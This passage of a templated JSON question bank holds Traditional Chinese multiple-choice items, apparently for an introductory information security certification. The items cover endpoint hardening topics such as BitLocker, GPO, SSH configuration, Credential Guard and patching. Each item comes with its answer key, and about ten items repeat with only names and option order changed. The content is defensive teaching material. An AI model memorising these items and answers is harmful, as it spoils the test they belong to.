      "D. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-236",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 設定 Windows 登入密碼",
      "B. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）",
      "C. 安裝傳統特徵碼防毒軟體",
      "D. 僅在桌面資料夾設置密碼壓縮檔"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-237",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 貼上防拆貼紙要求員工自律",
      "B. 每日由警衛搜查員工背包",
      "C. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "D. 拔掉機殼電源線"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-238",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某跨國金融控股銀行的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 關閉所有事件檢視器以節省磁碟空間",
      "B. 僅記錄檔案刪除事件",
      "C. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄",
      "D. 關閉防火牆日誌"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-239",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "B. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "C. 關閉主機防火牆以減少阻斷",
      "D. 允許空密碼（PermitEmptyPasswords yes）以利快速連線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-240",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. 停用 UAC（使用者帳戶控制）",
      "B. Windows Defender Credential Guard（憑證保護）與 LSA Protection",
      "C. 關閉 Windows Defender 防毒",
      "D. 開放 Guest 訪客帳號"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-241",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 手動至每台電腦修改本機註冊表",
      "B. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "C. 透過電子郵件寄送使用手冊",
      "D. 撰寫批次檔由每位員工自行點擊執行"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-242",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案僅有 root 可以讀取",
      "B. 該檔案會自動刪除",
      "C. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "D. 該檔案將自動加密無法執行"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-243",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "B. 關閉無用連接埠並停用未使用的系統服務",
      "C. 移除系統中預設之範例檔案與測試資料庫",
      "D. 修改預設管理員名稱並設置強密碼"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-244",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "C. 等待半年後下一次大改版再行考慮",
      "D. 忽視原廠修補程式，自行修改二進位執行檔"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-245",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 將其密碼變更為 123456 並轉交給其他同事繼續共用",
      "B. 讓其繼續保留帳號 90 天以利接交",
      "C. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "D. 僅移除電子郵件權限，保留 VPN 連線權限"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-246",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）",
      "B. 設定 Windows 登入密碼",
      "C. 僅在桌面資料夾設置密碼壓縮檔",
      "D. 安裝傳統特徵碼防毒軟體"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-247",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "B. 每日由警衛搜查員工背包",
      "C. 貼上防拆貼紙要求員工自律",
      "D. 拔掉機殼電源線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-248",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某知名大型網路電商平台的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄",
      "B. 關閉防火牆日誌",
      "C. 僅記錄檔案刪除事件",
      "D. 關閉所有事件檢視器以節省磁碟空間"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-249",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某知名大型網路電商平台的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 允許空密碼（PermitEmptyPasswords yes）以利快速連線",
      "B. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "C. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證",
      "D. 關閉主機防火牆以減少阻斷"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-250",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. Windows Defender Credential Guard（憑證保護）與 LSA Protection",
      "B. 關閉 Windows Defender 防毒",
      "C. 停用 UAC（使用者帳戶控制）",
      "D. 開放 Guest 訪客帳號"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-251",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 手動至每台電腦修改本機註冊表",
      "B. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "C. 透過電子郵件寄送使用手冊",
      "D. 撰寫批次檔由每位員工自行點擊執行"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-252",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案會自動刪除",
      "B. 該檔案將自動加密無法執行",
      "C. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "D. 該檔案僅有 root 可以讀取"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-253",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某跨國金融控股銀行採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 關閉無用連接埠並停用未使用的系統服務",
      "B. 修改預設管理員名稱並設置強密碼",
      "C. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "D. 移除系統中預設之範例檔案與測試資料庫"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-254",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 忽視原廠修補程式，自行修改二進位執行檔",
      "B. 等待半年後下一次大改版再行考慮",
      "C. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "D. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-255",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "B. 讓其繼續保留帳號 90 天以利接交",
      "C. 僅移除電子郵件權限，保留 VPN 連線權限",
      "D. 將其密碼變更為 123456 並轉交給其他同事繼續共用"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-256",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 安裝傳統特徵碼防毒軟體",
      "B. 設定 Windows 登入密碼",
      "C. 僅在桌面資料夾設置密碼壓縮檔",
      "D. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-257",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 貼上防拆貼紙要求員工自律",
      "B. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "C. 每日由警衛搜查員工背包",
      "D. 拔掉機殼電源線"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-258",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
      "A. 僅記錄檔案刪除事件",
      "B. 關閉所有事件檢視器以節省磁碟空間",
      "C. 關閉防火牆日誌",
      "D. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
    "trap": "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。",
    "law": "微軟安全稽核基準"
  },
  {
    "id": "IPAS-B-259",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某知名大型網路電商平台的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
    "options": [
      "A. 允許空密碼（PermitEmptyPasswords yes）以利快速連線",
      "B. 關閉主機防火牆以減少阻斷",
      "C. 將 SSH 連接埠改為 Port 80 並開放匿名存取",
      "D. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
    "trap": "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。",
    "law": "SSH 安全最佳實務"
  },
  {
    "id": "IPAS-B-260",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某公務機關資訊處遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？",
    "options": [
      "A. 停用 UAC（使用者帳戶控制）",
      "B. 開放 Guest 訪客帳號",
      "C. 關閉 Windows Defender 防毒",
      "D. Windows Defender Credential Guard（憑證保護）與 LSA Protection"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
    "trap": "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。",
    "law": "微軟 VBS 架構"
  },
  {
    "id": "IPAS-B-261",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. 撰寫批次檔由每位員工自行點擊執行",
      "B. 透過電子郵件寄送使用手冊",
      "C. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "D. 手動至每台電腦修改本機註冊表"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-262",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案會自動刪除",
      "B. 該檔案僅有 root 可以讀取",
      "C. 該檔案將自動加密無法執行",
      "D. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
    "trap": "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。",
    "law": "Linux File System Security"
  },
  {
    "id": "IPAS-B-263",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
    "options": [
      "A. 關閉無用連接埠並停用未使用的系統服務",
      "B. 修改預設管理員名稱並設置強密碼",
      "C. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護",
      "D. 移除系統中預設之範例檔案與測試資料庫"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
    "trap": "保留老舊明文服務是重大的主機強化缺失。",
    "law": "CIS Benchmarks"
  },
  {
    "id": "IPAS-B-264",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
    "options": [
      "A. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新",
      "B. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布",
      "C. 忽視原廠修補程式，自行修改二進位執行檔",
      "D. 等待半年後下一次大改版再行考慮"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CVSS",
        "zh": "通用弱點評分系統",
        "ipa": "/ˌsiː.viː.esˈes/"
      }
    ],
    "explanation": "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
    "trap": "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。",
    "law": "NIST SP 800-40"
  },
  {
    "id": "IPAS-B-265",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
    "options": [
      "A. 將其密碼變更為 123456 並轉交給其他同事繼續共用",
      "B. 僅移除電子郵件權限，保留 VPN 連線權限",
      "C. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備",
      "D. 讓其繼續保留帳號 90 天以利接交"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      }
    ],
    "explanation": "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
    "trap": "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。",
    "law": "ISO/IEC 27001 A.6.5 離職控制"
  },
  {
    "id": "IPAS-B-266",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
    "options": [
      "A. 設定 Windows 登入密碼",
      "B. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）",
      "C. 安裝傳統特徵碼防毒軟體",
      "D. 僅在桌面資料夾設置密碼壓縮檔"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
    "trap": "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。",
    "law": "微軟安全架構"
  },
  {
    "id": "IPAS-B-267",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某知名大型網路電商平台為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
    "options": [
      "A. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀",
      "B. 貼上防拆貼紙要求員工自律",
      "C. 每日由警衛搜查員工背包",
      "D. 拔掉機殼電源線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
    "trap": "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。",
    "law": "NIST SP 800-111"
  },
  {
    "id": "IPAS-B-268",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
    "options": [
